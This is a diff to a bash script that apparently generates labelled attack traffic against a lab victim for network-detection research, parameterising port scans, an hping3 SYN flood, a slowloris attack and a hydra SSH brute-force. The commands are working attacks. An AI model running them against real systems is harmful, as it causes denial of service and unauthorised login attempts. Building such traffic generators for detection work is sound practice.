@@ -1,38 +1,35 @@
 #!/usr/bin/env bash
-# Attack traffic generator: 
-# Use: attack.sh {portscan|dos|bruteforce} [victim_ip]
+# Attack generator (parameterized): counts/ports/sockets come from env vars set
+# by run_scenario, so each bout varies while attack semantics stay fixed.
+# Use: attacks.sh FAMILY [VICTIM]
+#   FAMILY = portscan | portscan_svc | dos_syn | dos_slow | bruteforce
 
 set -u
 
-FAMILY="${1:?usage: attacks.sh portscan|portscan_svc|dos_syn|dos_slow|bruteforce [victim] [duration]}"
+FAMILY="${1:?usage: attacks.sh FAMILY [victim]}"
 VICTIM="${2:-172.30.0.10}"
-DURATION="${3:-45}"
 
 case "$FAMILY" in
   portscan)
-    # fast SYN scan across 1-1024 -> many SYN-only micro-flows
-    echo "[attack] portscan (SYN, 1-1024) -> $VICTIM"
-    nmap -sS -T4 -p 1-1024 "$VICTIM"
+    echo "[attack] portscan SYN (${SCAN_PORTS:-1-1024}) -> $VICTIM"
+    nmap -sS -T4 -p "${SCAN_PORTS:-1-1024}" "$VICTIM"
     ;;
   portscan_svc)
-    # service/version detection -> completes handshakes, richer multi-packet flows
-    echo "[attack] portscan (service/version) -> $VICTIM"
-    nmap -sV -T4 -p 21,22,80,443,3306,8080 "$VICTIM"
+    echo "[attack] portscan svc (${SCAN_PORTS:-21,22,80,443,3306,8080}) -> $VICTIM"
+    nmap -sV -T4 -p "${SCAN_PORTS:-21,22,80,443,3306,8080}" "$VICTIM"
     ;;
   dos_syn)
-    # bounded SYN flood: small on purpose (these husk-collapse under dedup)
-    echo "[attack] dos (bounded SYN flood) -> ${VICTIM}:80"
-    hping3 -S -p 80 -i u500 -c 2500 "$VICTIM"
+    echo "[attack] dos SYN flood (c=${DOS_COUNT:-2500} i=${DOS_INTERVAL:-u500}) -> ${VICTIM}:80"
+    hping3 -S -p 80 -i "${DOS_INTERVAL:-u500}" -c "${DOS_COUNT:-2500}" "$VICTIM"
     ;;
   dos_slow)
-    # slowloris: many long-lived half-open connections -> real multi-packet flows
-    echo "[attack] dos (slowloris, ${DURATION}s) -> ${VICTIM}:80"
-    timeout "${DURATION}s" slowloris "$VICTIM" -p 80 -s 200 --sleeptime 15 || true
+    echo "[attack] dos slowloris (s=${SLOW_SOCKETS:-200} ${SLOW_DURATION:-45}s) -> ${VICTIM}:80"
+    timeout "${SLOW_DURATION:-45}s" slowloris "$VICTIM" -p 80 \
+        -s "${SLOW_SOCKETS:-200}" --sleeptime "${SLOW_SLEEP:-15}" || true
     ;;
   bruteforce)
-    # SSH brute-force; no -f so it works the whole wordlist (many connection flows)
-    echo "[attack] ssh brute-force -> $VICTIM"
-    hydra -l victimuser -P /scripts/passwords.txt -t 4 -I "ssh://${VICTIM}"
+    echo "[attack] ssh brute-force (${WORDLIST:-/scripts/passwords.txt}) -> $VICTIM"
+    hydra -l victimuser -P "${WORDLIST:-/scripts/passwords.txt}" -t 4 -I "ssh://${VICTIM}"
     ;;
   *)
     echo "unknown family: $FAMILY" >&2; exit 2 ;;
